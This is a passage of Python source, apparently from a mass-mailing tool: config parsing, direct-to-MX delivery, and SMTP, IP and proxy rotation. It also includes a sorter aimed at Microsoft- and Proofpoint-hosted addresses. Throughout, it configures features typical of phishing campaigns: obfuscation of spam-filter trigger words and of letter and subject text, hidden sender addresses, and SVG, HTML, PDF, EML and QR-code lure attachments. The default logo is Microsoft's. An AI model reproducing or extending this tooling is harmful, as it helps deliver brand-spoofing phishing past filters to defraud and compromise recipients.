                            print(f"{Fore.CYAN}[SORTER+SEND] Queued {os.path.basename(filepath)} line {line_number}: {email} [IP={bind_ip}]{Style.RESET_ALL}")

                        current_position = f.tell()

                    with sorter_file_lock:
                        sorter_file_positions[filepath] = current_position
                except Exception as e:
                    print(f"{Fore.YELLOW}[SORTER+SEND] Error monitoring {filepath}: {str(e)}{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.YELLOW}[SORTER+SEND] Monitor loop error: {str(e)}{Style.RESET_ALL}")

        time.sleep(poll_delay)


def run_sorter_in_background(email_list_file, sorter_threads):
    """Run sorter in a background thread for concurrent processing"""
    def sorter_worker():
        try:
            import subprocess
            sorter_script = os.path.join("sorter", "main.py")
            
            # Copy email list to sorter directory
            # No need to copy leads.txt; sorter/main.py now reads leads.txt directly
            
            print(f"{Fore.CYAN}[SORTER+SEND] Sorter running in background with {sorter_threads} threads...{Style.RESET_ALL}\n")
            result = subprocess.run([sys.executable, sorter_script, "--threads", str(sorter_threads)], 
                                  capture_output=False, text=True)
            print(f"\n{Fore.GREEN}[SORTER+SEND] Sorter completed.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[SORTER+SEND] Sorter error: {str(e)}{Style.RESET_ALL}")
    
    sorter_thread = threading.Thread(target=sorter_worker, daemon=False)
    sorter_thread.start()
    return sorter_thread


def normalize_attachment_list(value):
    if value is None:
        return []
    if isinstance(value, (list, tuple, set)):
        raw_items = list(value)
    elif isinstance(value, str):
        text = value.strip()
        if not text:
            return []
        if text.startswith('[') and text.endswith(']'):
            text = text[1:-1]
        raw_items = [item.strip() for item in text.split(',') if item.strip()]
    else:
        raw_items = [str(value)]
    normalized = []
    for item in raw_items:
        item = str(item).strip().strip('"\'')
        if not item:
            continue
        normalized.append(item.lower())
    return normalized


def _strip_yaml_inline_comment(value):
    """Remove a trailing ' #' or ' ;' comment, respecting simple quoting.

    The hand-written setup.ini uses both '#' and ';' for inline comments
    (e.g. ``force_mx_filter: true   ; off by default``). Only a marker that
    is preceded by whitespace starts a comment, and markers inside a quoted
    string are ignored.
    """
    in_quote = None
    for i, ch in enumerate(value):
        if in_quote:
            if ch == in_quote:
                in_quote = None
        elif ch in ('"', "'"):
            in_quote = ch
        elif ch in ('#', ';') and i > 0 and value[i - 1] in (' ', '\t'):
            return value[:i].rstrip()
    return value.rstrip()


class _YamlDup(list):
    """Values of a duplicated simple-YAML key, kept in document order.

    setup.ini is hand-edited and can repeat a key inside one section (for
    example a second ``enable`` in the 'Tester&Send config' block). Keeping
    every occurrence lets the loader decide what each one means instead of
    silently losing the first.
    """


def parse_simple_yaml(content):
    # Normalise block indentation. setup.ini is hand-edited and frequently
    # pasted with a uniform leading indent, so strip the common block prefix.
    # Two constraints keep this safe:
    #   * only trim when the indented lines look like a pasted block
    #     (minimum indent >= 4); a normal 0/2-space config is left untouched;
    #   * never trim when doing so would drop a column-0 parent and its child
    #     onto the same level, which would flatten nested sections (e.g.
    #     html_eml_config) into {} and silently lose their settings.
    content = textwrap.dedent(content)
    lines = content.splitlines()
    indented = [len(line) - len(line.lstrip(' ')) for line in lines if line.strip() and line.startswith(' ')]
    if indented:
        trim = min(indented)
        if trim >= 4:
            collapse = False
            for idx, line in enumerate(lines):
                if not line.strip() or line.startswith(' '):
                    continue  # only a column-0 (root-parent) line can collapse
                for nxt in lines[idx + 1:]:
                    if not nxt.strip():
                        continue
                    nxt_indent = len(nxt) - len(nxt.lstrip(' '))
                    if nxt_indent == trim:
                        collapse = True
                    break
                if collapse:
                    break
            if not collapse:
                content = '\n'.join(line[trim:] if line.startswith(' ' * trim) else line for line in lines)

    # Distinguishes a key that carries no value (start of a nested section)
    # from a key explicitly set to an empty string, e.g. shape_color: "".
    empty_value = object()

    def parse_scalar(raw):
        value = raw.strip()
        if not value:
            return empty_value
        if value.startswith('#') or value.startswith(';'):
            return empty_value
        value = _strip_yaml_inline_comment(value)
        if not value:
            return empty_value
        quoted = len(value) >= 2 and value[0] == value[-1] and value[0] in ('"', "'")
        if quoted:
            return value[1:-1]
        if value.startswith('[') and value.endswith(']'):
            inner = value[1:-1].strip()
            if not inner:
                return []
            parts = []
            for piece in inner.split(','):
                item = piece.strip()
                if not item:
                    continue
                parts.append(parse_scalar(item))
            return parts
        if value.lower() in ('true', 'false'):
            return value.lower() == 'true'
        try:
            return int(value)
        except ValueError:
            try:
                return float(value)
            except ValueError:
                return value

    data = {}
    stack = [(-1, data)]
    for raw_line in content.splitlines():
        stripped = raw_line.strip()
        if not stripped or stripped.startswith('#') or stripped.startswith(';'):
            continue
        indent = len(raw_line) - len(raw_line.lstrip(' '))
        line = raw_line.strip()
        if ':' not in line:
            continue
        key, value = line.split(':', 1)
        key = key.strip()
        value = parse_scalar(value)
        while stack[-1][0] >= indent:
            stack.pop()
        parent = stack[-1][1]
        if value is empty_value:
            existing = parent.get(key)
            if isinstance(existing, dict):
                stack.append((indent, existing))
            else:
                parent[key] = {}
                stack.append((indent, parent[key]))
        else:
            if key not in parent:
                parent[key] = value
            elif isinstance(parent[key], _YamlDup):
                parent[key].append(value)
            else:
                parent[key] = _YamlDup([parent[key], value])
    return data

# ============ VDM host mode (v4) ============
vdm_host_mode = False
vdm_port = 25
vdm_force_mx = ''
vdm_helo = '{hash}'
vdm_timeout = 30
vdm_frommail = ''
vdm_fromname = ''
vdm_force_mx_filter = False   # v9.2: host_config.force_mx_filter

def load_vdm_host_config(data):
    """Parse sender_config.sending_mode + host_config; sets the vdm_* globals."""
    global vdm_host_mode, vdm_port, vdm_force_mx, vdm_helo, vdm_timeout, vdm_frommail, vdm_fromname
    global vdm_force_mx_filter
    vdm_host_mode = False
    vdm_force_mx_filter = False
    vdm_frommail = ''
    vdm_fromname = ''
    try:
        sender_cfg = data.get('sender_config') or {}
        host_cfg = data.get('host_config') or {}
        mode = str(sender_cfg.get('sending_mode', 'smtp') or 'smtp').strip().lower()
        # v9.5: sending_mode may combine tokens (e.g. "smtp | host"); test the token
        # list instead of requiring the entire string to equal 'host'.
        _mode_tokens = [t.strip() for t in mode.replace(',', '|').replace('+', '|').split('|') if t.strip()]
        enabled = str(host_cfg.get('enable', 'true')).strip().lower() in ('1', 'true', 'yes', 'on')
        if 'host' in _mode_tokens and enabled:
            vdm_host_mode = True
            try:
                vdm_port = int(str(host_cfg.get('port', 25)).strip() or 25)
            except Exception:
                vdm_port = 25
            vdm_force_mx = str(host_cfg.get('force_mx', '') or '').strip()
            # v9.2: host_config.force_mx_filter - skip leads whose domain is not
            # hosted on Microsoft EOP instead of delivering to a fabricated host.
            vdm_force_mx_filter = str(host_cfg.get('force_mx_filter', 'false')).strip().lower() in ('1', 'true', 'yes', 'on')
            vdm_helo = str(host_cfg.get('helo_name', '') or '').strip()
            vdm_frommail = str(host_cfg.get('host_frommail', host_cfg.get('hostfrommail', '')) or '').strip()
            vdm_fromname = str(host_cfg.get('host_fromname', host_cfg.get('hostfromname', '')) or '').strip()
            try:
                vdm_timeout = int(str(host_cfg.get('timeout', 30)).strip() or 30)
            except Exception:
                vdm_timeout = 30
            print(f"{Fore.CYAN}[VDM] Host mode active - direct-to-MX delivery on port {vdm_port}"
                  f"{f' (pinned MX: {vdm_force_mx})' if vdm_force_mx else ''}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.YELLOW}[VDM] host_config parse warning: {e}{Style.RESET_ALL}")
		
def load_sender_config(path, apply_runtime=True):
    """Read a config file into a parser.

    apply_runtime=True (default) applies the config to the runtime state
    (configure_optional_features / load_vdm_host_config / load_sending_modes),
    matching the startup behaviour. Pass apply_runtime=False when only the
    parsed values are needed (e.g. recovering PDF settings inside Sendout):
    re-applying the runtime config mid-run would reset globals such as the
    test_config state and clobber an in-progress test&send phase.
    """
    parser = configparser.ConfigParser(interpolation=None)
    try:
        parser.read(path, 'utf8')
        if parser.sections():
            if apply_runtime:
                configure_optional_features(parser)
            return parser
    except configparser.MissingSectionHeaderError:
        pass
    try:
        with open(path, 'r', encoding='utf-8-sig') as config_file:
            data = parse_simple_yaml(config_file.read())
        if apply_runtime:
            load_vdm_host_config(data)
            load_sending_modes(data)
    except Exception as exc:
        raise configparser.MissingSectionHeaderError(path, 1, str(exc))

    def section(name, values):
        parser.add_section(name)
        for key, value in values.items():
            parser.set(name, key, '' if value is None else str(value))

    sender_cfg = data.get('sender_config') or {}
    leads_cfg = data.get('leads_config') or {}
    smtp_cfg = data.get('smtp_config') or {}
    ip_cfg = data.get('ip_config') or {}
    proxy_cfg = data.get('proxies_config') or data.get('proxy_setup') or {}
    subject_cfg = data.get('subject_config') or {}
    from_name_cfg = data.get('from_name_config') or {}
    from_mail_cfg = data.get('from_mail_config') or {}
    links_cfg = data.get('links_config') or {}
    reply_cfg = data.get('reply_to_config') or {}
    qrcode_cfg = data.get('qrcode_config') or {}
    logo_cfg = data.get('logo_config') or {}
    email_headers_cfg = data.get('email_headers_config') or {}
    html_image_cfg = data.get('html_image_config') or {}
    html_attachment_cfg = data.get('html_attachment_config') or {}
    svg_attachment_cfg = data.get('svg_attachment_config') or {}
    link_svg_cfg = data.get('link_svg_config') or {}
    local_files_cfg = data.get('local_files_config') or {}
    doc_cfg = data.get('html_doc_config') or {}
    pdf_cfg = data.get('html_pdf_config') or {}
    rtf_cfg = data.get('html_rtf_config') or {}
    eml_cfg = data.get('html_eml_config') or {}
    pptx_cfg = data.get('html_pptx_config') or {}
    ics_cfg = data.get('icalendar_config') or {}
    zip_cfg = data.get('zip_config') or {}
    other_cfg = data.get('local_files_config') or {}
    pause_cfg = data.get('pause_config') or {}
    disclaimer_cfg = data.get('disclaimer_config') or {}
    letter_encryption_cfg = data.get('letter_encryption_config') or {}
    words_encryption_cfg = data.get('words_encryption_config') or {}
    bcc_cfg = data.get('bcc_config') or {}
    test_cfg = data.get('test_config') or {}
    delete_cfg = data.get('delete_config') or {}
    local_image_cfg = data.get('local_image_config') or {}
    section('TOKEN', {'token': 'yaml-config'})
    section('SMTP', {
        'smtpserv': smtp_cfg.get('host', ''), 'port': smtp_cfg.get('port', 25),
        'username': smtp_cfg.get('username', ''), 'password': smtp_cfg.get('password', ''),
        'secure': str(smtp_cfg.get('method', '')).lower() in ('tls', 'ssl'),
        'authy': bool(smtp_cfg.get('username') or smtp_cfg.get('password')),
        'fromemail': smtp_cfg.get('from_mail', ''), 'priority': 'NORMAL', 'loadsmtp': smtp_cfg.get('enable_multiple', False),
        'list': smtp_cfg.get('list', 'SMTP/smtp.txt'),
        'dangerous': smtp_cfg.get('dangerous', False),
        'sending_limit': smtp_cfg.get('sending_limit', -1),
        'retry_limit': smtp_cfg.get('retry_limit', 0),
        'retry_delay_secs': smtp_cfg.get('retry_delay_secs', 5),
        'selection_system': smtp_cfg.get('selection_system', 1),
    })
    section('SEND INFO', {
        'name': smtp_cfg.get('from_mail', ''), 'fromemail': smtp_cfg.get('from_mail', ''),
        'link': links_cfg.get('link', ''), 'subject': subject_cfg.get('subject', 'New Message'),
    })
    section('bcc_config', {
        'enable': bcc_cfg.get('enable', False),
        'list': bcc_cfg.get('list', 'MULTIPLE/bcc.txt'),
        'sending_limit': bcc_cfg.get('sending_limit', 5),
    })
    _periodic_enable_cfg, _tester_enable_cfg = _resolve_test_enables(test_cfg)
    section('test_config', {
        'enable': _periodic_enable_cfg,
        'email': test_cfg.get('email', ''),
        'after': test_cfg.get('after', 10),
        'subject': test_cfg.get('subject', ''),
        'letter': test_cfg.get('letter', ''),
        'time': test_cfg.get('time', 0),
        'time_unit': test_cfg.get('time_unit', 'sec'),
        'group_size': test_cfg.get('group_size', 0),
        'pace': test_cfg.get('pace', '1by1'),
        'skip_processed': test_cfg.get('skip_processed', True),
        'ledger_persist': test_cfg.get('ledger_persist', False),
        'enable_multiple': test_cfg.get('enable_multiple', False),
        'tester': _tester_enable_cfg,
        'tester&send': test_cfg.get('tester&send', False),
        'testerfromname': test_cfg.get('testerfromname', ''),
    })
    section('delete_config', {
        'enable': delete_cfg.get('enable', False),
    })
    section('local_image_config', {
        'enable': local_image_cfg.get('enable', False),
        'location': local_image_cfg.get('location', 'LOCAL_IMAGE'),
    })
    section('OPTION', {
        'leads': leads_cfg.get('target', 'LEADS/leads.txt'), 'mstype': sender_cfg.get('message_type', 'html'),
        'enableCSV': leads_cfg.get('enable_csv', False), 'locationCSV': leads_cfg.get('csv_location', 'LEADS/leads.csv'),
        'delay': 0, 'useRedirect': 0, '403domain': '', 'IgnoreEmail': 0, 'IGNList': '', 'IGType': 'Exclude',
        'thread': sender_cfg.get('workers', 1), 'sender': sender_cfg.get('enabled', True), 'sorter': False, 'sorter+send': False,
        'thread_count': sender_cfg.get('workers', 1), 'ip_thread_count': 0,
        'localipfile': ip_cfg.get('list', 'MULTIPLE/ips.txt'), 'localiplist': '', 'rotateip': ip_cfg.get('enable', False), 'useqrcode': qrcode_cfg.get('enable', False),
        'timezone': sender_cfg.get('timezone', 'UTC'), 'inline_images': sender_cfg.get('inline_images', False),
        'ignoreemail': False, 'serverbusy': False, 'stopwatch': False, 'stopwatch_pattern': '',
        'max_concurrent_sends': 0, 'send_delay': 0,
    })
    section('pause_config', {
        'enable': pause_cfg.get('enable', False),
        'time': pause_cfg.get('time', 0),
        'tasks': pause_cfg.get('tasks', 0),
    })
    section('disclaimer_config', {
        'enable': disclaimer_cfg.get('enable', False),
        'location': disclaimer_cfg.get('location', 'DISCLAIMER/confidential.txt'),
        'enable_multiple': disclaimer_cfg.get('enable_multiple', False),
        'multiple_location': disclaimer_cfg.get('multiple_location', 'DISCLAIMER'),
    })
    section('DOC OPTION', {'Docname': doc_cfg.get('html_location', ''), 'DocTit': '', 'Doctype': 'html', 'CreationDelay': 0, 'Hide_HTML_Code': False, 'usedoc': False, 'autohtml': False})
    letter_cfg = data.get('letter_config') or {}
    letter_enable = bool(
        letter_encryption_cfg.get('enable', False)
        or letter_encryption_cfg.get('enable_encryption', False)
        or letter_encryption_cfg.get('enableEncryption', False)
        or letter_cfg.get('enable_encryption', False)
        or letter_cfg.get('enableEncryption', False)
    )
    subject_enable = bool(
        subject_cfg.get('enable', False)
        or subject_cfg.get('enable_encryption', False)
        or subject_cfg.get('enableEncryption', False)
    )
    word_enable = bool(
        words_encryption_cfg.get('enable', False)
        or words_encryption_cfg.get('enable_encryption', False)
        or words_encryption_cfg.get('enableEncryption', False)
    )
    section('letter_setup', {
        'letter': letter_cfg.get('letter', 'LETTER/letter.html'),
        'enableMultiple': letter_cfg.get('enable_multiple', False),
        'letterList': letter_cfg.get('list', 'MULTIPLE/letters.txt'),
        'selection_system': _mode_int(letter_cfg.get('selection_system', 1), 1),
        'enableEncryption': letter_enable,
        'enable_encryption': letter_enable,
        'customEncryption': letter_cfg.get('custom_encryption', 'Multiple/Myscript.txt'),
        'technique': letter_encryption_cfg.get('encryption_method', letter_cfg.get('encryption_method', 1)),
    })
    section('subject_setup', {
        'subject': subject_cfg.get('subject', 'New Message'),
        'enableMultiple': subject_cfg.get('enable_multiple', False),
        'subjectList': subject_cfg.get('list', 'MULTIPLE/subjects.txt'),
        'selection_system': _mode_int(subject_cfg.get('selection_system', 1), 1),
        'enableEncryption': subject_enable,
        'enable_encryption': subject_enable,
        'technique': subject_cfg.get('encryption_method', 2),
    })
    section('spamWordEncryption', {
        'enable': word_enable,
        'enable_encryption': word_enable,
        'enableEncryption': word_enable,
        'spamList': words_encryption_cfg.get('list', 'MULTIPLE/SpamList.txt'),
        'technique': words_encryption_cfg.get('technique', 2),
    })
    section('fromname_setup', {
        'fromName': from_name_cfg.get('from_name', ''), 'enableMultiple': from_name_cfg.get('enable_multiple', False),
        'fromnameList': from_name_cfg.get('list', 'MULTIPLE/from_name.txt'),
        'selection_system': _mode_int(from_name_cfg.get('selection_system', 1), 1),
    })
    section('frommail_setup', {
        'hideFromMail': from_mail_cfg.get('Hide_from_mail', from_mail_cfg.get('hide_from_mail', False)),
        'enableMultiple': from_mail_cfg.get('enable_multiple', False),
        'frommailList': from_mail_cfg.get('list', 'MULTIPLE/from_mail.txt'),
        'selection_system': _mode_int(from_mail_cfg.get('selection_system', 1), 1),
    })
    section('link_setup', {
        'link': links_cfg.get('link', ''), 'limit': links_cfg.get('limit', -1),
        'enableMultiple': links_cfg.get('enable_multiple', False), 'linkList': links_cfg.get('list', 'MULTIPLE/links.txt'),
        'selection_system': _mode_int(links_cfg.get('selection_system', 1), 1),
    })
    section('replyTo_setup', {'replyTo': reply_cfg.get('reply_to', ''), 'replyToName': reply_cfg.get('reply_to_name', ''), 'enable': reply_cfg.get('enable', False)})
    section('qrcode_setup', {
        'enable': qrcode_cfg.get('enable', False),
        'qrlink': qrcode_cfg.get('text', ''),
        'shape': _mode_int(qrcode_cfg.get('shape', 1), 1),
        'qrSize': 128,
        'shapeColor': qrcode_cfg.get('shape_color', ''),
        'backgroundColor': qrcode_cfg.get('background_color', ''),
        'margin': qrcode_cfg.get('margin', 4),
        'customIcon': qrcode_cfg.get('enable_custom_icon', False),
        'iconLocation': qrcode_cfg.get('icon_location', ''),
        'iconShape': qrcode_cfg.get('icon_shape', 1),
        'iconBackgroundColor': qrcode_cfg.get('icon_background_color', ''),
        'hideQrCode': qrcode_cfg.get('enable_hide_qrcode', False),
    })
    section('logo_config', {
        'enable': logo_cfg.get('enable', False),
        'location': logo_cfg.get('location', 'LOGO/microsoft.png'),
    })
    section('proxy_setup', {
        'enable': proxy_cfg.get('enable', False), 'ip': proxy_cfg.get('ip', ''),
        'port': proxy_cfg.get('port', 1080), 'user': proxy_cfg.get('user', ''),
        'password': proxy_cfg.get('password', ''),
        'enableMultiple': proxy_cfg.get('enable_multiple', proxy_cfg.get('enableMultiple', False)),
        'proxiesList': proxy_cfg.get('proxies_list', proxy_cfg.get('proxiesList', 'MULTIPLE/Proxies.txt')),
    })
    section('htmlimage', {
        'enable': html_image_cfg.get('enable', False), 'location': html_image_cfg.get('html_location', 'HTML_IMAGE/image.html'),
        'enableMultiple': html_image_cfg.get('enable_multiple', False), 'multipleLocation': html_image_cfg.get('multiple_location', 'HTML_IMAGE/image1.html'),
        'width': html_image_cfg.get('screen_width', 1024), 'height': html_image_cfg.get('screen_height', 768),
        'enableClip': html_image_cfg.get('enable_clip', False),
        'clipLeft': html_image_cfg.get('clip_left', 1), 'clipTop': html_image_cfg.get('clip_top', 1),
        'clipWidth': html_image_cfg.get('clip_width', 1024), 'clipHeight': html_image_cfg.get('clip_height', 768),
        'scale': html_image_cfg.get('scale', 2.0),
        'displayWidth': html_image_cfg.get('display_width', 600),
        'displayHeight': html_image_cfg.get('display_height', 0),
        'resolutionX': 100, 'resolutionY': 100, 'name': 'attachHtmlImage.png',
        'showSample': html_image_cfg.get('show_sample', False), 'sampleEmail': html_image_cfg.get('sample_email', ''),
        'sampleFocus': html_image_cfg.get('sample_focus', True),
        'sampleFocusPadding': html_image_cfg.get('sample_focus_padding', 24),
        'sampleHandles': html_image_cfg.get('sample_handles', False),
    })
    section('htmlAttachment', {
        'enable': html_attachment_cfg.get('enable', False), 'location': html_attachment_cfg.get('html_location', 'HTMLAttachment/attachment.html'),
        'name': html_attachment_cfg.get('name', 'message.html'), 'encrypt': html_attachment_cfg.get('encrypt', False),
        'enableMultiple': html_attachment_cfg.get('enable_multiple', False), 'htmlList': html_attachment_cfg.get('multiple_html_location', 'MULTIPLE/html_attachments.txt'),
        'attachAll': html_attachment_cfg.get('selection_system', 1) == 3,
        'zip_it': html_attachment_cfg.get('zip_it', False),
    })
    section('link_svg', {
        'enable': link_svg_cfg.get('enable', False),
        'link': link_svg_cfg.get('link', '{link}'),
        'name': link_svg_cfg.get('name', 'ATT0{NUMBER6}{USERNAME}.svg'),
        'zip_it': link_svg_cfg.get('zip_it', False),
    })
    section('svgAttachment', {
        'enable': svg_attachment_cfg.get('enable', False), 'name': svg_attachment_cfg.get('name', 'file.svg'),
        'location': svg_attachment_cfg.get('file_location', 'SVG/file.svg'),
        'encrypt': False, 'enableMultiple': False, 'svgList': 'MULTIPLE/svg_attachments.txt', 'attachAll': False,
        'zip_it': svg_attachment_cfg.get('zip_it', False),
    })
    section('pdf', {
        'enable': pdf_cfg.get('enable', False), 'location': pdf_cfg.get('html_location', 'PDF/pdf.html'),
        'name': pdf_cfg.get('name', 'document.pdf'), 'layout': pdf_cfg.get('layout', 1),
        'page_type': pdf_cfg.get('page_type', 1), 'margin': pdf_cfg.get('margin', 0.4),
        'password_protection': pdf_cfg.get('password_protection', False),
        'password': pdf_cfg.get('password', ''), 'zip_it': pdf_cfg.get('zip_it', False),
    })
    section('docx', {'enable': doc_cfg.get('enable', False), 'location': doc_cfg.get('html_location', 'DOC/doc.html'), 'name': doc_cfg.get('name', 'information.docx'), 'zip_it': doc_cfg.get('zip_it', False)})
    section('doc', {'enable': doc_cfg.get('enable', False), 'location': doc_cfg.get('html_location', 'DOC/doc.html'), 'name': doc_cfg.get('name', 'information.doc'), 'zip_it': doc_cfg.get('zip_it', False)})
    section('rtf', {'enable': rtf_cfg.get('enable', False), 'location': rtf_cfg.get('html_location', 'RTF/rtf.html'), 'name': rtf_cfg.get('name', 'inspect.rtf'), 'zip_it': rtf_cfg.get('zip_it', False)})
    section('pptx', {'enable': pptx_cfg.get('enable', False), 'location': pptx_cfg.get('html_location', 'PPTX/pptx.html'), 'name': pptx_cfg.get('name', 'presentation.pptx'), 'zip_it': pptx_cfg.get('zip_it', False)})
    section('icalendar', {
        'enable': ics_cfg.get('enable', False), 'summary': ics_cfg.get('summary', 'Team Meeting'),
        'description': ics_cfg.get('description', ''), 'location': ics_cfg.get('location', ''),
        'starts': ics_cfg.get('starts', '2025-06-05T09:00:00'), 'ends': ics_cfg.get('ends', '2025-06-05T10:00:00'),
        'organizer_name': ics_cfg.get('organizer_name', ''), 'organizer_email': ics_cfg.get('organizer_email', ''),
        'attendee_name': ics_cfg.get('attendee_name', ''), 'attendee_email': ics_cfg.get('attendee_email', ''),
        'name': ics_cfg.get('name', 'meeting.ics'),
    })
    section('eml', {
        'enable': eml_cfg.get('enable', False), 'location': eml_cfg.get('html_location', 'EML/eml.html'), 'name': eml_cfg.get('name', 'message.eml'),
        'subject': eml_cfg.get('subject', 'New Message'),
        'from': eml_cfg.get('from_mail', eml_cfg.get('from', '')),
        'from_name': eml_cfg.get('from_name', ''),
        'to': eml_cfg.get('recipient_mail', eml_cfg.get('to', '')),
        'to_name': eml_cfg.get('recipient_name', eml_cfg.get('to_name', '')),
        'emlAttachment': eml_cfg.get('only_eml', True),
        'onlyEml': eml_cfg.get('only_eml', True), 'attachments': normalize_attachment_list(eml_cfg.get('attachments', '')),
        'attachToOuter': eml_cfg.get('attach_to_outer', True), 'attachType': eml_cfg.get('attach_type', 'message/rfc822'), 'attachName': eml_cfg.get('attach_name', ''),
    })
    section('zip_config', {
        'enable': zip_cfg.get('enable', False),
        'password_protection': zip_cfg.get('password_protection', False),
        'password': zip_cfg.get('password', 'zip123'),
        'name': zip_cfg.get('name', 'archive.zip'),
        'zip_all': zip_cfg.get('zip_all', True),
    })
    section('local_files', {
        'enable': local_files_cfg.get('enable', False), 'location': local_files_cfg.get('file_location', 'MULTIPLE/local_files.txt'),
        'selection': local_files_cfg.get('selection_system', 1),
    })
    section('otherFile', {'enable': False, 'location': '', 'name': 'attachment'})
    custom_header_path = str(email_headers_cfg.get('headers_location', 'HEADERS/headers.txt') or '').strip()
    custom_header_enabled = bool(email_headers_cfg.get('enable', False))
    custom_header_sets_from_file = load_custom_header_sets(custom_header_path) if custom_header_enabled else []
    custom_header_values = custom_header_sets_from_file[0] if custom_header_sets_from_file else {}
    section('CUSTOM_HEADERS', {
        **custom_header_values,
        'enabled': custom_header_enabled,
        'multiple headers': len(custom_header_sets_from_file) > 1,
        'headersList': custom_header_path,
    })
    if apply_runtime:
        configure_optional_features(parser)
    return parser


try:
    try:
        if os.path.isfile('setup.ini'):
            config = load_sender_config("setup.ini")
            Token = config.get('TOKEN', 'token')
            smtpserv = config.get('SMTP', 'smtpserv')
            port = config.get('SMTP', 'port')
            username = config.get('SMTP', 'username')
            password = config.get('SMTP', 'password')
            secure = config.get('SMTP', 'secure')
            authy = config.get('SMTP', 'authy')
            sender =  config.get('SMTP', 'fromemail')
            priority =  config.get('SMTP', 'priority')
            f_loadsmtp =  config.get('SMTP', 'loadsmtp')
            smtp_pool_file = config.get('SMTP', 'list', fallback='SMTP/smtp.txt').strip() or 'SMTP/smtp.txt'
            smtp_dangerous = cfg_get_bool(config, 'SMTP', 'dangerous', False)
            smtp_retry_limit = max(0, config.getint('SMTP', 'retry_limit', fallback=0))
            smtp_retry_delay_secs = max(0, config.getint('SMTP', 'retry_delay_secs', fallback=5))

            name = config.get('SEND INFO', 'name')
            fromemail =  config.get('SEND INFO', 'fromemail')
            link =  config.get('SEND INFO', 'link') 
            configure_custom_headers(config)
            print('[REPLYGATE-v4.6] Custom headers: ' + ('ENABLED' if custom_headers_enabled else 'DISABLED (no custom headers will touch SMTP)') + ' | Reply-To: ' + ('ENABLED' if int(replyTo_setup.get('enable', 0)) == 1 else 'DISABLED'))
            if custom_headers_enabled:
                configured_header_names = sorted({
                    str(key).strip()
                    for profile in (custom_header_sets or [custom_headers])
                    for key in profile
                    if str(key).strip().lower() in ('message-id', 'return_path', 'return-path')
                })
                print(f"[HEADERS] Loaded {len(custom_header_sets or [custom_headers])} profile(s): {', '.join(configured_header_names) or 'none'}", flush=True)

            default_address = config.get('OPTION', 'leads', fallback=leads_setup_target)
            subject = config.get('SEND INFO', 'subject')
            try:
                subject_rotate = cfg_get_bool(config, 'OPTION', 'subject_rotate', False)
            except Exception:
                subject_rotate = False
            try:
                subject_file = config.get('OPTION', 'subject_file').strip() or 'subject.txt'
            except Exception:
                subject_file = 'subject.txt'
            if subject_rotate:
                if os.path.isfile(subject_file):
                    try:
                        with open(subject_file, 'r', encoding='utf-8') as f:
                            subject_lines = [line.strip() for line in f if line.strip()]
                    except Exception:
                        subject_lines = []
                    if not subject_lines:
                        print(f"{Fore.YELLOW}[WARN] subject rotation enabled but {subject_file} is empty. Using default subject.{Style.RESET_ALL}")
                        subject_rotate = False
                else:
                    print(f"{Fore.YELLOW}[WARN] subject rotation enabled but {subject_file} not found. Using default subject.{Style.RESET_ALL}")
                    subject_rotate = False

            msgtype = config.get('OPTION', 'mstype')
            secs = config.get('OPTION', 'delay')
            useRedirect = config.get('OPTION', 'useRedirect')
            domain403 = config.get('OPTION', '403domain')

            sfile = config.get('DOC OPTION', 'Docname')
            DocTit = config.get('DOC OPTION', 'DocTit')
            Doctype = config.get('DOC OPTION', 'Doctype')
            Docsecs = config.get('DOC OPTION', 'CreationDelay')
            KillHTML = config.get('DOC OPTION', 'Hide_HTML_Code')

            IgnoreEmail = config.get('OPTION', 'IgnoreEmail')
            IGNList = config.get('OPTION', 'IGNList')
            IGType = config.get('OPTION', 'IGType')

            threads = config.get('OPTION', 'thread')

            try:
                ip_thread = cfg_get_bool(config, 'OPTION', 'ip_thread', False)
            except Exception:
                ip_thread = False

            try:
                ip_thread_count = int(config.get('OPTION', 'ip_thread_count'))
            except Exception:
                ip_thread_count = int(threads) if threads and str(threads).isdigit() else 1

            # Load sorter configuration (boolean flags)
            try:
                enable_sorter = cfg_get_bool(config, 'OPTION', 'sorter', False)
            except:
                enable_sorter = False
            
            try:
                enable_sorter_send = cfg_get_bool(config, 'OPTION', 'sorter+send', False)
            except:
                enable_sorter_send = False
            
            try:
                enable_sender = cfg_get_bool(config, 'OPTION', 'sender', True)
            except:
                enable_sender = True
            
            try:
                sorter_email_list = config.get('OPTION', 'sorter_email_list').strip()
            except:
                # No need to copy leads.txt; sorter/main.py now reads leads.txt directly
                pass
            
            try:
                sorter_target_files = config.get('OPTION', 'sorter_target_files').strip()
            except:
                sorter_target_files = 'ppe-hosted_emails.txt, pphosted_emails.txt, office_mx_emails.txt'
            
            try:
                sorter_threads = int(config.get('OPTION', 'sorter_threads'))
            except:
                sorter_threads = 5



            loadsmtp = cfg_get_bool(config, 'SMTP', 'loadsmtp', False)
            try:
                smtp_selection_system = config.getint('SMTP', 'selection_system', fallback=1)
            except Exception:
                smtp_selection_system = 1
            smtp_rotation_index = 0

            its_authy = cfg_get_bool(config, 'SMTP', 'authy', False)

            usedoc = cfg_get_bool(config, 'DOC OPTION', 'usedoc', False)
            autokilllink = cfg_get_bool(config, 'DOC OPTION', 'autohtml', False)

            its_secure = cfg_get_bool(config, 'SMTP', 'secure', False)

            use_sort = cfg_get_bool(config, 'OPTION', 'ignoreemail', False)

            rotate_ip = cfg_get_bool(config, 'OPTION', 'rotateip', False)
            local_ip_file = config.get('OPTION', 'localipfile').strip()
            if local_ip_file and os.path.isfile(local_ip_file):
                with open(local_ip_file, 'r') as ipfile:
                    local_ips = [ip.strip() for ip in re.split(r'[,;\s]+', ipfile.read()) if ip.strip()]
            else:
                local_ips = [ip.strip() for ip in re.split(r'[,;\s]+', config.get('OPTION', 'localiplist')) if ip.strip()]
            local_ips = normalize_bind_ip_list(local_ips)
            with ip_rotation_lock:
                ip_index = 0

            autoKillHTML = str(KillHTML).strip().lower() in ('1','true','yes','on')

            msg_priority = '2'  if priority.lower() == 'high'.lower() else '0'
            try:
                use_qrcode = cfg_get_bool(config, 'OPTION', 'useqrcode', False)
            except Exception:
                use_qrcode = False
            if config.has_section('qrcode_setup'):
                qrcode_setup['enable'] = 1 if cfg_get_bool(config, 'qrcode_setup', 'enable', False) else 0
                use_qrcode = bool(qrcode_setup['enable'])
                qrcode_setup['qrlink'] = config.get('qrcode_setup', 'qrlink', fallback=qrcode_setup['qrlink']).strip()
                qrcode_setup['shapeColor'] = config.get('qrcode_setup', 'shapeColor', fallback=qrcode_setup['shapeColor']).strip()
